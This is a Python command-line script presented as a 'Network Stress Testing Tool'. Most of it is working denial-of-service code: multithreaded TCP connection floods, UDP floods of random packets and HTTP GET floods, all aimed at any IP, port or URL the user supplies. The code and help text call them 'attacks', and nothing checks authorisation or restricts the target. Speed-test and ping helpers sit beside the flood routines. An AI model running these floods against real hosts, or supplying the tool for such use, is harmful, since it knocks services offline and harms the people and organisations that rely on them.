#!/usr/bin/env python3
import argparse
import concurrent.futures
import socket
import time
import random
import threading
import requests
from ping3 import ping
import speedtest

class NetworkStressTester:
    def __init__(self):
        self.running = False
        self.threads = []
        
    def tcp_flood(self, target_ip, target_port, duration, max_threads):
        self.running = True
        end_time = time.time() + duration
        
        def attack():
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                    s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
                    s.close()
                except:
                    pass
        
        print(f"Starting TCP flood attack on {target_ip}:{target_port} for {duration} seconds")
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(attack) for _ in range(max_threads)]
            concurrent.futures.wait(futures)
        
        print("TCP flood attack completed")

    def udp_flood(self, target_ip, target_port, duration, max_threads):
        self.running = True
        end_time = time.time() + duration
        
        def attack():
            while self.running and time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(1024), (target_ip, target_port))
                    s.close()
                except:
                    pass
        
        print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds")
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(attack) for _ in range(max_threads)]
            concurrent.futures.wait(futures)
        
        print("UDP flood attack completed")

    def http_flood(self, target_url, duration, max_threads):
        self.running = True
        end_time = time.time() + duration
        
        def attack():
            while self.running and time.time() < end_time:
                try:
                    requests.get(target_url, timeout=5)
                except:
                    pass
        
        print(f"Starting HTTP flood attack on {target_url} for {duration} seconds")
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(attack) for _ in range(max_threads)]
            concurrent.futures.wait(futures)
        
        print("HTTP flood attack completed")

    def stop_attacks(self):
        self.running = False
        print("Stopping all attacks...")

    def run_speed_test(self):
        print("Running speed test...")
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1_000_000  # Convert to Mbps
        upload_speed = st.upload() / 1_000_000  # Convert to Mbps
        print(f"Download Speed: {download_speed:.2f} Mbps")
        print(f"Upload Speed: {upload_speed:.2f} Mbps")
        return download_speed, upload_speed

    def ping_test(self, target, count=5):
        print(f"Pinging {target} {count} times...")
        times = []
        for _ in range(count):
            response_time = ping(target, unit='ms')
            if response_time is not None:
                times.append(response_time)
                print(f"Response from {target}: time={response_time:.2f}ms")
            else:
                print("Request timed out")
        
        if times:
            avg = sum(times) / len(times)
            print(f"\nAverage ping: {avg:.2f}ms")
            return avg
        return None

def main():
    parser = argparse.ArgumentParser(description="Network Stress Testing Tool")
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # TCP Flood
    tcp_parser = subparsers.add_parser('tcp', help='TCP flood attack')
    tcp_parser.add_argument('target_ip', help='Target IP address')
    tcp_parser.add_argument('target_port', type=int, help='Target port')
    tcp_parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    tcp_parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    
    # UDP Flood
    udp_parser = subparsers.add_parser('udp', help='UDP flood attack')
    udp_parser.add_argument('target_ip', help='Target IP address')
    udp_parser.add_argument('target_port', type=int, help='Target port')
    udp_parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    udp_parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    
    # HTTP Flood
    http_parser = subparsers.add_parser('http', help='HTTP flood attack')
    http_parser.add_argument('target_url', help='Target URL (include http:// or https://)')
    http_parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    http_parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    
    # Speed Test
    speed_parser = subparsers.add_parser('speedtest', help='Run speed test')
    
    # Ping Test
    ping_parser = subparsers.add_parser('ping', help='Ping test')
    ping_parser.add_argument('target', help='Target to ping (IP or domain)')
    ping_parser.add_argument('--count', type=int, default=5, help='Number of pings')
    
    args = parser.parse_args()
    tester = NetworkStressTester()
    
    try:
        if args.command == 'tcp':
            tester.tcp_flood(args.target_ip, args.target_port, args.duration, args.threads)
        elif args.command == 'udp':
            tester.udp_flood(args.target_ip, args.target_port, args.duration, args.threads)
        elif args.command == 'http':
            tester.http_flood(args.target_url, args.duration, args.threads)
        elif args.command == 'speedtest':
            tester.run_speed_test()
        elif args.command == 'ping':
            tester.ping_test(args.target, args.count)
    except KeyboardInterrupt:
        tester.stop_attacks()

if __name__ == "__main__":
    main()
